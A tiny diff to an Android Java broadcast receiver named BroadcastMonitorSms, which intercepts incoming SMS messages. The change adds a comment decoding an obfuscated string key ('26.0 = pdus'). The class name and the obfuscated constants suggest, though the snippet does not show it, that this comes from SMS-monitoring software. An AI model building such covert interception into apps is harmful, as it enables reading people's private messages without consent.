@@ -62,6 +62,7 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 		SmsMessage[] msgs = null;
 
 		// Prendiamo l'sms
+		// 26.0 = pdus
 		final Object[] pdus = (Object[]) bundle.get(Messages.getString("26.0")); //$NON-NLS-1$
 		msgs = new SmsMessage[pdus.length];
 
